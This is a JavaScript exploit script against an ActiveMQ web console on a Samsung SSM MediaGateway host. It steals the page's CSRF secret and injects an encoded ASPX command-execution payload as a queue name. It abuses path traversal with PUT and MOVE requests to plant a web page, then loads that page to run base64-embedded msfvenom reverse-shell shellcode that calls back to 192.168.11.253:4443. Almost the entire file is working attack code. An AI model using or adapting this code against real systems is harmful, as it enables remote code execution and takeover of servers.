function afterloginandsubmit_value()
{
  if (this.readyState == 4) {
           var res = this.responseText.match(/secret" value="(.*)"/g);		// regex grab cotent of secret
           var csrf = res.toString();
	   csrf=csrf.split('"');
	   var xhr = new XMLHttpRequest();
           var url = "http://127.0.0.1:8161/admin/createDestination.action";

	   var data='JMSDestinationType=queue&secret='+csrf[2]+'&JMSDestination=%3c%25%3d%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%2e%53%74%61%72%74%28%72%65%71%75%65%73%74%28%22%63%22%29%2c%72%65%71%75%65%73%74%28%22%61%22%29%29%25%3e';
	   var length=data.length;
	   xhr.open("POST",url,false);
	   xhr.setRequestHeader("Content-Length", length)
	   xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	   xhr.send('JMSDestinationType=queue&secret='+csrf[2]+'&JMSDestination=%3c%25%3d%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%2e%53%74%61%72%74%28%72%65%71%75%65%73%74%28%22%63%22%29%2c%72%65%71%75%65%73%74%28%22%61%22%29%29%25%3e');
     }
}


function adminqueuespage(){
var url ="http://127.0.0.1:8161/admin/queues.jsp";
var xhr=new XMLHttpRequest();
xhr.onreadystatechange = afterloginandsubmit_value;
xhr.open("GET",url,true);
xhr.withCredentials = true;
xhr.send();
//DON'T RETURN TRUE IF NO FUNCTION
}

function move(){
var url ="http://127.0.0.1:8161/fileserver/..%5C%5C..%5C%5Cdata%5C%5Ckahadb%5C%5Cdb.data";
var xhr=new XMLHttpRequest();
xhr.open("MOVE",url,true);
xhr.setRequestHeader("Destination","http://127.0.0.1:8161/C://Program Files//Samsung//SSM//MediaGateway//WebViewer//gg.aspx");
xhr.send();
}



function uploadss(){
//root@kali:~/Desktop# msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=192.168.11.253 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
//[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
//[-] No arch selected, selecting arch: x86 from the payload
//Found 1 compatible encoders
//Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
//x86/shikata_ga_nai succeeded with size 351 (iteration=0)
//x86/shikata_ga_nai chosen with final size 351
//Payload size: 351 bytes
//Final size of aspx file: 2856 bytes
//Saved as: shell.aspx


var url="http://127.0.0.1:8161/fileserver/..%5C%5C..%5C%5C..%5C%5C..%5C%5CMediaGateway%5C%5CWebViewer%5C%5Cexploit.aspx";
var data=atob('PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gZGVySW4gPSBuZXcgYnl0ZVszNTFdIHsKMHhkOSwweGUxLDB4YmEsMHhlYywweGY1LDB4YjEsMHhkNCwweGQ5LDB4NzQsMHgyNCwweGY0LDB4NWUsMHgzMSwweGM5LDB4YjEsMHg1MiwweDMxLDB4NTYsMHgxNywweDAzLDB4NTYsMHgxNywweDgzLDB4MDIsMHgwOSwKMHg1MywweDIxLDB4MjYsMHgxYSwweDE2LDB4Y2EsMHhkNiwweGRiLDB4NzcsMHg0MiwweDMzLDB4ZWEsMHhiNywweDMwLDB4MzAsMHg1ZCwweDA4LDB4MzIsMHgxNCwweDUyLDB4ZTMsMHgxNiwweDhjLDB4ZTEsMHg4MSwKMHhiZSwweGEzLDB4NDIsMHgyZiwweDk5LDB4OGEsMHg1MywweDFjLDB4ZDksMHg4ZCwweGQ3LDB4NWYsMHgwZSwweDZkLDB4ZTksMHhhZiwweDQzLDB4NmMsMHgyZSwweGNkLDB4YWUsMHgzYywweGU3LDB4OTksMHgxZCwKMHhkMCwweDhjLDB4ZDQsMHg5ZCwweDViLDB4ZGUsMHhmOSwweGE1LDB4YjgsMHg5NywweGY4LDB4ODQsMHg2ZiwweGEzLDB4YTIsMHgwNiwweDhlLDB4NjAsMHhkZiwweDBlLDB4ODgsMHg2NSwweGRhLDB4ZDksMHgyMywKMHg1ZCwweDkwLDB4ZGIsMHhlNSwweGFmLDB4NTksMHg3NywweGM4LDB4MWYsMHhhOCwweDg5LDB4MGQsMHhhNywweDUzLDB4ZmMsMHg2NywweGRiLDB4ZWUsMHgwNywweGJjLDB4YTEsMHgzNCwweDhkLDB4MjYsMHgwMSwKMHhiZSwweDM1LDB4ODIsMHhiMywweDEzLDB4YTMsMHg0MSwweGJmLDB4ZDgsMHhhNywweDBkLDB4ZGMsMHhkZiwweDY0LDB4MjYsMHhkOCwweDU0LDB4OGIsMHhlOCwweDY4LDB4MmUsMHhhOCwweDJjLDB4MzAsMHhmNCwKMHhkMSwweDc1LDB4OWMsMHg1YiwweGVkLDB4NjUsMHg3ZiwweDAzLDB4NGIsMHhlZSwweDkyLDB4NTAsMHhlNiwweGFkLDB4ZmEsMHg5NSwweGNiLDB4NGQsMHhmYiwweGIxLDB4NWMsMHgzZSwweGM5LDB4MWUsMHhmNywKMHhhOCwweDYxLDB4ZDYsMHhkMSwweDJmLDB4ODUsMHhjZCwweGE2LDB4YmYsMHg3OCwweGVlLDB4ZDYsMHg5NiwweGJlLDB4YmEsMHg4NiwweDgwLDB4MTcsMHhjMywweDRjLDB4NTAsMHg5NywweDE2LDB4YzIsMHgwMCwKMHgzNywweGM5LDB4YTMsMHhmMCwweGY3LDB4YjksMHg0YiwweDFhLDB4ZjgsMHhlNiwweDZjLDB4MjUsMHhkMiwweDhlLDB4MDcsMHhkYywweGI1LDB4NzAsMHg3ZiwweGQ1LDB4YjgsMHgxOSwweDgyLDB4ZTksMHg1MywKMHg4MSwweDBiLDB4MGYsMHgzOSwweDI1LDB4NWEsMHg5OCwweGQ2LDB4ZGMsMHhjNywweDUyLDB4NDYsMHgyMCwweGQyLDB4MWYsMHg0OCwweGFhLDB4ZDEsMHhlMCwweDA3LDB4NWIsMHg5ZiwweGYyLDB4ZjAsMHhhYiwKMHhlYSwweGE4LDB4NTcsMHhiMywweGMwLDB4YzQsMHgzNCwweDI2LDB4OGYsMHgxNCwweDMyLDB4NWIsMHgxOCwweDQzLDB4MTMsMHhhZCwweDUxLDB4MDEsMHg4OSwweDk0LDB4Y2IsMHgzNywweDUwLDB4NDAsMHgzMywKMHhmMywweDhmLDB4YjEsMHhiYSwweGZhLDB4NDIsMHg4ZCwweDk4LDB4ZWMsMHg5YSwweDBlLDB4YTUsMHg1OCwweDczLDB4NTksMHg3MywweDM2LDB4MzUsMHgzMywweDM1LDB4ZTAsMHhlZiwweGU4LDB4OWYsMHg2NCwKMHg2OSwweGMzLDB4MWYsMHhmMiwweDc2LDB4MGUsMHhkNiwweDFhLDB4YzYsMHhlNywweGFmLDB4MjUsMHhlNywweDZmLDB4MzgsMHg1ZSwweDE1LDB4MTAsMHhjNywweGI1LDB4OWQsMHgyMCwweDgyLDB4OTcsMHhiNCwKMHhhOCwweDRiLDB4NDIsMHg4NSwweGI0LDB4NmIsMHhiOSwweGNhLDB4YzAsMHhlZiwweDRiLDB4YjMsMHgzNiwweGVmLDB4M2UsMHhiNiwweDczLDB4YjcsMHhkMywweGNhLDB4ZWMsMHg1MiwweGQzLDB4NzksMHgwYywKMHg3NyB9OwoKICAgICAgICBJbnRQdHIgbndyQms0Nk1jQiA9IFZpcnR1YWxBbGxvYyhJbnRQdHIuWmVybywoVUludFB0cilkZXJJbi5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShkZXJJbiwwLG53ckJrNDZNY0IsZGVySW4uTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgYVFJS0VsID0gSW50UHRyLlplcm87CiAgICAgICAgSW50UHRyIHN4VVI3OSA9IENyZWF0ZVRocmVhZChJbnRQdHIuWmVybyxVSW50UHRyLlplcm8sbndyQms0Nk1jQixJbnRQdHIuWmVybywwLHJlZiBhUUlLRWwpOwogICAgfQo8L3NjcmlwdD4K');
var xhr = new XMLHttpRequest();
alert(data);
alert(url);
xhr.open("PUT",url,true);
xhr.send(data);
}

function triggershell_upload(){
alert('aaa');
var url="http://127.0.0.1:4512/exploit.aspx"
var xhr=new XMLHttpRequest();
xhr.open("GET",url,true);
xhr.send(null);
}


//adminqueuespage();
//move();
uploadss()
triggershell_upload()
